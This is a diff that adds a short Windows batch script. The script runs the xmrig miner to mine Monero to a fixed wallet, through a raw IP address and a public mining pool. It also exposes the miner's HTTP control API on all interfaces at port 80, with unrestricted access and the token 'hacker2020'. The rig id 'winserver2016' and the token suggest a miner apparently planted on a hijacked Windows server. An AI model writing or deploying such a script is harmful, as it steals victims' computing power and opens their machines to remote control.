@@ -1,0 +1,2 @@
+@echo off
+xmrig.exe --http-enabled --api-worker-id 127.0.0.1 --http-host 0.0.0.0 --http-port 80 --http-access-token hacker2020 --http-no-restricted -o 147.135.37.31:80 -u 41k8GajDoKSbzbPb9EvqkwWonJTE9kxDG38udoUx5FsiMkUv1TvNtTA5iSvkpoEQFi941RRTHkiJnUqwoFxFWMcTFneVZk4 --coin monero --daemon --tls -o pool.minexmr.com:443 -u 41k8GajDoKSbzbPb9EvqkwWonJTE9kxDG38udoUx5FsiMkUv1TvNtTA5iSvkpoEQFi941RRTHkiJnUqwoFxFWMcTFneVZk4 -k --tls --rig-id winserver2016 -t 8
